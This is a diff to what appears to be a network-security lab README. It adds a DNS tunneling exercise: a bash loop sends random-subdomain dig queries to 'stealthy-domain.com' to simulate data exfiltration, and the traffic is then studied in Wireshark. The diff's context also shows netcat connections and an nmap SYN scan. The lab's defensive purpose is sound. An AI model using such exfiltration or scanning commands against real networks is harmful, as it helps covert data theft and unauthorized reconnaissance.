@@ -241,7 +241,7 @@ sudo apt install nmap
 nc -l -p 1234
 ```
 
-- ### On the Client VM, connect to the server's open port:
+- ### On the `Client VM`, connect to the server's open port:
 ```bash
 nc 10.10.10.50 1234
 ```
@@ -270,6 +270,50 @@ During the normal TCP 3-way handshake test, we observed the expected packet exch
 In contrast, the SYN scan test using `nmap -sS` demonstrated a half-open connection. The `client sent a SYN`, the `server replied with SYN-ACK`, but instead of completing the handshake, the `client responded with an immediate RST`. This is characteristic of stealth scanning techniques often used by attackers to detect open ports without fully establishing a connection.
 
 ---
+
+<img width="1340" height="120" alt="dns drawio" src="https://github.com/user-attachments/assets/0602dc8a-ca47-44ac-b374-2b1f033b2a2d" />
+
+## DNS TUNNELING
+
+### Step 1: Set up the Client VM
+
+- ### Install `dig` (DNS query tool):
+```bash
+sudo apt install dnsutils -y
+```
+
+### *Start `Wireshark` and begin capturing on `enp0s3`.*
+
+---
+
+### Step 2: Simulate DNS-based Data Exfiltration
+- ### Run the following script to simulate tunneling via randomized subdomains:
+```bash
+for i in {1..30}; do
+   dig $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c20).stealthy-domain.com @10.10.10.50
+done
+```
+
+<img width="729" height="277" alt="Lab 38" src="https://github.com/user-attachments/assets/dd57a1e1-e1c5-4d5b-905a-1889c3f90ad6" />
+
+---
+
+### Step 3: Analyze the `DNS Tunneling` in Wireshark
+
+- ### Apply the display filter: `dns`
+
+<img width="1423" height="627" alt="Lab 40" src="https://github.com/user-attachments/assets/34dd9ab5-aa2d-4a8e-b8be-2a55667f456d" /></br>
+
+During the simulation, Wireshark captured multiple DNS query packets originating from the attacker VM directed to `stealthy-domain.com`, demonstrating the encoded subdomain requests typical of DNS tunneling or data exfiltration attempts. These queries contained randomized alphanumeric strings in the subdomain portion, mimicking how sensitive data might be covertly encoded within DNS requests. Shortly after these DNS packets, `ICMP “Destination Unreachable”` messages were observed repeatedly—five times in quick succession—indicating that the DNS server or network device did not recognize or could not route the queried domain. This pattern is consistent with an attacker attempting to exfiltrate data via DNS, while the network or target system rejects or fails to resolve these crafted requests, potentially signaling an attempted stealthy communication or misconfiguration in the simulated environment.
+
+---
+
+
+
+
+
+
+
 
 
 
